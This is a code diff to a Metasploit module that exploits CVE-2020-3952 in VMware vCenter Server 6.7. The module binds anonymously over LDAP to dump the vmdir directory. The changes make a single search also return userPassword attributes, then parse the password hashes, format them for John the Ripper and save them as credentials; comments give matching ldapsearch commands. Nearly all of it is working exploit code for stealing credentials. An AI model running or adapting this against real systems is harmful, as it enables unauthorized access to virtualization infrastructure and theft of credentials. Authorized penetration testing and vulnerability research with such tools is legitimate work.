@@ -16,10 +16,11 @@ class MetasploitModule < Msf::Auxiliary
         'Description' => %q{
           This module uses an anonymous-bind LDAP connection to dump data from
           the vmdir service in VMware vCenter Server version 6.7 prior to the
-          6.7U3f update.
+          6.7U3f update, only if upgraded from a previous release line, such as
+          6.0 or 6.5.
         },
         'Author' => [
-          'Hynek Petrak', # Discovered by, added hash dumping
+          'Hynek Petrak', # Discovery, hash dumping
           'wvu' # Module
         ],
         'References' => [
@@ -62,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
   #   ldapsearch -xb "" -s base -H ldap://[redacted]
   #
   # Dump data using discovered base DN:
-  #   ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted]
+  #   ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted] \* + -
   def run
     opts = {
       host: rhost,
@@ -71,7 +72,6 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     entries = nil
-    hash_entries = nil
 
     Net::LDAP.open(opts) do |ldap|
       if (@base_dn = datastore['BASE_DN'])
@@ -85,11 +85,9 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       print_status("Dumping LDAP data from vmdir service at #{peer}")
-      entries = ldap.search(base: base_dn)
 
-      attrs = ["-", "userPassword"]
-      filter = "(userPassword = *)"
-      hash_entries = ldap.search(base: base_dn, filter: filter, attributes: attrs)
+      # A "-" meta-attribute will dump userPassword (hat tip Hynek)
+      entries = ldap.search(base: base_dn, attributes: %w[* + -])
     end
 
     # Look for an entry with a non-empty vmwSTSPrivateKey attribute
@@ -99,13 +97,6 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_good("#{peer} is vulnerable to CVE-2020-3952")
-
-    if hash_entries.any?
-      process_hashes(hash_entries)
-    else
-      print_status("#{peer} no passowrd hashes found")
-    end
-
     pillage(entries)
 
     # HACK: Stash discovered base DN in CheckCode reason
@@ -137,51 +128,51 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good("Saved LDAP data to #{ldif_filename}")
 
-    policy = entries.find { |entry| entry.dn == policy_dn }
-
-    if policy
+    if (policy = entries.find { |entry| entry.dn == policy_dn })
       print_status('Password and lockout policy:')
       print_line(policy.to_ldif)
     end
+
+    # Process entries with a non-empty userPassword attribute
+    process_hashes(entries.select { |entry| entry[:userpassword].any? })
   end
 
   def process_hashes(entries)
-    service_data = {
-      address: rhost,
-      port: rport,
-      service_name: 'ldap',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
+    if entries.empty?
+      print_status('No password hashes found')
+      return
+    end
 
     entries.each do |entry|
+      # This is the "username"
       dn = entry.dn
-      userpass = entry.userpassword.first.to_s
-      type = userpass[0].ord
 
-      # https://github.com/vmware/lightwave/blob/d50d41edd1d9cb59e7b7cc1ad284b9e46bfa703d/lwraft/server/middle-layer/password.c#L36
-      if type == 1
-        hexhash = userpass.unpack("H*").first
-        hash = hexhash[2, 128]
-        salt = hexhash[2+128, 32]
-        john_hash = "$dynamic_82$#{hash}$HEX$#{salt}"
-        print_good("#{peer} Credentials found: #{dn}:#{john_hash}")
+      # https://github.com/vmware/lightwave/blob/637a1935fdd3cae4df6aa8925c69fd5744ab1a88/lwraft/server/middle-layer/password.c#L36-L45
+      type, hash, salt = entry[:userpassword].unpack('CH128H32')
 
-        credential_data = {
-          jtr_format: 'dynamic_82',
-          origin_type: :service,
-          module_fullname: fullname,
-          private_type: :nonreplayable_hash,
-          private_data: john_hash,
-          username: dn,
-          workspace_id: myworkspace_id
-        }.merge(service_data)
-
-        create_credential(credential_data)
-      else
-        print_error("#{peer} FIXME: hash type #{type} not yet supported")
+      unless type == 1
+        vprint_error("Hash type #{type} not supported yet (#{dn})")
         next
       end
+
+      # https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/doc/DYNAMIC
+      john_hash = "$dynamic_82$#{hash}$HEX$#{salt}"
+
+      print_good("Credentials found: #{dn}:#{john_hash}")
+
+      create_credential(
+        workspace_id: myworkspace_id,
+        module_fullname: fullname,
+        origin_type: :service,
+        address: rhost,
+        port: rport,
+        protocol: 'tcp',
+        service_name: 'vmdir/ldap',
+        username: dn,
+        private_data: john_hash,
+        private_type: :nonreplayable_hash,
+        jtr_format: 'dynamic_82'
+      )
     end
   end
 
